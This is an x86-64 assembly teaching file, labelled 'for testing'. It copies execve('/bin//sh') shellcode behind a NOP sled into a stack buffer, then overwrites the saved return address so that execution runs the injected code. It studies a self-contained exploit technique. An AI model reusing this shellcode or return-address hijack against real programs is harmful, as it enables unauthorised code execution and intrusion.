;
; SPDX-License-Identifier: CC-BY-NC-SA-4.0
;
; Copyright (C) 2024 Oscar Szumiak
;

; Direct injection of binary code into stack buffer for testing

section .data

EXIT_SUCCESS	equ		0           ; success code
SYS_exit		equ		60          ; exit

STRLEN		    equ     40
NOPLENGTH       equ     8

injectionCode           db      0x48, 0x31, 0xC0, 0x50, 0x48, 0xBB, 0x2F, 0x2F
                        db      0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x53, 0xB0
                        db      0x3B, 0x48, 0x89, 0xE7, 0x48, 0x31, 0xF6, 0x48
                        db      0x31, 0xD2, 0x0F, 0x05, 0x90, 0x90, 0x90, 0x90

injectionCodeLength     dq      32


section .text

global injectCode
injectCode:
    push    rbp
    mov     rbp, rsp
    sub     rsp, STRLEN             ; Allocate stack buffer of size STRLEN

funStart:
    mov     rcx, 0
nopLoop:
    mov     byte [rsp+rcx], 0x90
    inc     rcx
    cmp     rcx, NOPLENGTH
    jb      nopLoop

    mov     rbx, 0
    mov     rdx, injectionCode
injectionLoop:                      ; Inject code
    mov     al, byte [rdx+rbx]
    mov     byte [rsp+rcx], al
    inc     rcx
    inc     rbx
    cmp     rbx, qword [injectionCodeLength]
    jb      injectionLoop

    mov     qword [rbp+8], rsp     ; Move start location of injected code
                                   ; into rip

funEnd:
    add     rsp, STRLEN
    pop     rbp
    ret

global _start
_start:

    call    injectCode

last:
    mov     rax, SYS_exit
    mov     rdi, EXIT_SUCCESS
    syscall

